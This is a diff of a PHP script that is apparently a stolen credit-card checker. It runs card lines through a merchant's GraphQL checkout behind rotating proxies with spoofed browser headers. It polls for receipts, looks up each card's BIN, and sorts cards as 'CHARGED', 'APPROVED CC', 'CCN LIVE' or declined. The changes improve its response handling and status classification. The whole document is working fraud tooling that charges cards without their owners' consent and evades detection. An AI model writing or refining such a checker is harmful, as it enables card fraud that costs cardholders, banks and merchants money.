-            $r5js = json_decode($response5);
-            
-            // Process the poll response
-            if (isset($r5js->data->receipt->processingError->code)) {
-                $err = $r5js->data->receipt->processingError->code;
-                if (isset($r5js->data->receipt->processingError->messageUntranslated)) {
-                    $err .= " - " . $r5js->data->receipt->processingError->messageUntranslated;
-                }
-            } elseif (isset($r5js->data->receipt->__typename) && $r5js->data->receipt->__typename === 'ProcessedReceipt') {
-                $err = '🔥 CHARGED $21.97 ✅';
-            } elseif (isset($r5js->data->receipt->__typename) && $r5js->data->receipt->__typename === 'ProcessingReceipt') {
-                $err = '🔄 Payment Still Processing';
-            } else {
-                $err = 'Payment processing failed';
-            }
-            
-        } else {
-            $err = 'No receipt ID received';
-        }
+            // FIXED: Proper error handling for all response types
+            if (isset($response4js->data->submitForCompletion->receipt->id)) {
+                $recipt_id = $response4js->data->submitForCompletion->receipt->id;
+                
+                // Check if it's already processed
+                if (isset($response4js->data->submitForCompletion->receipt->__typename)) {
+                    $receipt_type = $response4js->data->submitForCompletion->receipt->__typename;
+                    
+                    if ($receipt_type === 'ProcessedReceipt') {
+                        $err = '🔥 CHARGED $21.97 ✅';
+                    } elseif ($receipt_type === 'ProcessingReceipt') {
+                        $err = '🔄 Payment Still Processing';
+                    } elseif ($receipt_type === 'FailedReceipt') {
+                        if (isset($response4js->data->submitForCompletion->receipt->processingError->messageUntranslated)) {
+                            $err = $response4js->data->submitForCompletion->receipt->processingError->messageUntranslated;
+                        } else {
+                            $err = '❌ Payment Failed';
+                        }
+                    }
+                } else {
+                    // If no typename, poll for status
+                    $pollQuery = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){__typename ...on ProcessedReceipt{id token redirectUrl}...on ProcessingReceipt{id pollDelay}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}}';
 
-    } catch(Exception $e) {
-        if (empty($err)) {
-            $err = $e->getMessage();
+                    $postf2 = json_encode([
+                        'query' => $pollQuery,
+                        'variables' => [
+                            'receiptId' => $recipt_id,
+                            'sessionToken' => $x_checkout_one_session_token
+                        ],
+                        'operationName' => 'PollForReceipt'
+                    ]);
+
+                    $ch = curl_init();
+                    curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=PollForReceipt');
+                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
+                    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+                        'accept: application/json',
+                        'accept-language: en-US',
+                        'content-type: application/json',
+                        'origin: '.$urlbase,
+                        'priority: u=1, i',
+                        'referer: '.$urlbase,
+                        'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
+                        'sec-ch-ua-mobile: ?0',
+                        'sec-ch-ua-platform: "Windows"',
+                        'sec-fetch-dest: empty',
+                        'sec-fetch-mode: cors',
+                        'sec-fetch-site: same-origin',
+                        'user-agent: '.$ua,
+                        'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
+                        'x-checkout-web-build-id: 63e3454a054ed16691c8d7d3dfaf57981df0b7df',
+                        'x-checkout-web-deploy-stage: production',
+                        'x-checkout-web-server-handling: fast',
+                        'x-checkout-web-server-rendering: no',
+                        'x-checkout-web-source-id: ' . $checkoutToken,
+                    ]);
+
+                    curl_setopt($ch, CURLOPT_POSTFIELDS, $postf2);
+                    curl_setopt($ch, CURLOPT_PROXY, $proxy['ip'].':'.$proxy['port']);
+                    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['username'].':'.$proxy['password']);
+                    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+                    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+
+                    $response5 = curl_exec($ch);
+                    $http_code5 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+                    curl_close($ch);
+
+                    $r5js = json_decode($response5);
+                    
+                    if (isset($r5js->data->receipt->__typename)) {
+                        $receipt_type = $r5js->data->receipt->__typename;
+                        
+                        if ($receipt_type === 'ProcessedReceipt') {
+                            $err = '🔥 CHARGED $21.97 ✅';
+                        } elseif ($receipt_type === 'ProcessingReceipt') {
+                            $err = '🔄 Payment Still Processing';
+                        } elseif ($receipt_type === 'FailedReceipt') {
+                            if (isset($r5js->data->receipt->processingError->messageUntranslated)) {
+                                $err = $r5js->data->receipt->processingError->messageUntranslated;
+                            } else {
+                                $err = '❌ Payment Failed';
+                            }
+                        }
+                    } else {
+                        $err = 'Unknown payment status';
+                    }
+                }
+            } elseif (isset($response4js->data->submitForCompletion->reason)) {
+                $err = "❌ " . $response4js->data->submitForCompletion->reason;
+            } elseif (isset($response4js->errors)) {
+                $err = "GraphQL Error: ";
+                foreach ($response4js->errors as $error) {
+                    $err .= ($error->message ?? 'Unknown error') . " ";
+                }
+            } else {
+                $err = "No valid response from server";
+            }
+
+        } catch(Exception $e) {
+            if (empty($err)) {
+                $err = $e->getMessage();
+            }
         }
     }
 
     $end_time = microtime(true);
     $time_taken = number_format($end_time - $start_time, 2);
 
-    // BIN lookup
+    // BIN lookup with better error handling
     $bin = substr($cc, 0, 6);
-    $bininfo = @json_decode(file_get_contents("https://lookup.binlist.net/{$bin}"), true);
+    $bank = 'Unavailable';
+    $country = 'Unknown';
+    $brand = 'Unknown';
+    $type = 'Unknown';
 
-    if (!$bininfo || !isset($bininfo['bank'])) {
-        $bininfo = @json_decode(file_get_contents("https://bins.antipublic.cc/bins/{$bin}"), true);
-        $bank = $bininfo['data']['bank'] ?? 'Unavailable';
-        $country = $bininfo['data']['country'] ?? 'Unknown';
-        $brand = $bininfo['data']['vendor'] ?? 'Unknown';
-        $type = $bininfo['data']['type'] ?? 'Unknown';
-    } else {
-        $bank = $bininfo['bank']['name'] ?? 'Unavailable';
-        $country = $bininfo['country']['name'] ?? 'Unknown';
-        $brand = $bininfo['scheme'] ?? 'Unknown';
-        $type = $bininfo['type'] ?? 'Unknown';
+    try {
+        $bininfo = @json_decode(file_get_contents("https://lookup.binlist.net/{$bin}"), true);
+        if ($bininfo) {
+            $bank = $bininfo['bank']['name'] ?? 'Unavailable';
+            $country = $bininfo['country']['name'] ?? 'Unknown';
+            $brand = $bininfo['scheme'] ?? 'Unknown';
+            $type = $bininfo['type'] ?? 'Unknown';
+        } else {
+            $bininfo = @json_decode(file_get_contents("https://bins.antipublic.cc/bins/{$bin}"), true);
+            if ($bininfo && isset($bininfo['data'])) {
+                $bank = $bininfo['data']['bank'] ?? 'Unavailable';
+                $country = $bininfo['data']['country'] ?? 'Unknown';
+                $brand = $bininfo['data']['vendor'] ?? 'Unknown';
+                $type = $bininfo['data']['type'] ?? 'Unknown';
+            }
+        }
+    } catch (Exception $e) {
+        // BIN lookup failed, use defaults
     }
 
-    // Status logic
-    if (stripos($err, 'CHARGED') !== false || stripos($err, 'purchase') !== false || stripos($err, '⚠️ 3D Secure Challenge Required!!') !== false || stripos($err, 'INCORRECT_CVC') !== false || stripos($err, 'Order') !== false) {
+    // Status logic - IMPROVED
+    if (stripos($err, 'CHARGED') !== false) {
         $status = "✅ 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐂𝐂";
+    } elseif (stripos($err, 'Processing') !== false) {
+        $status = "🔄 𝐏𝐑𝐎𝐂𝐄𝐒𝐒𝐈𝐍𝐆";
+    } elseif (stripos($err, '3D') !== false || stripos($err, 'Challenge') !== false) {
+        $status = "⚠️ 𝟑𝐃 𝐒𝐄𝐂𝐔𝐑𝐄 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃";
+    } elseif (stripos($err, 'CVC') !== false || stripos($err, 'CVV') !== false) {
+        $status = "✅ 𝐂𝐂𝐍 𝐋𝐈𝐕𝐄";
     } else {
         $status = "❌ 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 𝐂𝐂";
     }
@@ -837,4 +889,5 @@ foreach ($cc_lines as $cc_line) {
     echo str_repeat(' ', 1024);
     flush();
 
-}?>
+}
+?>
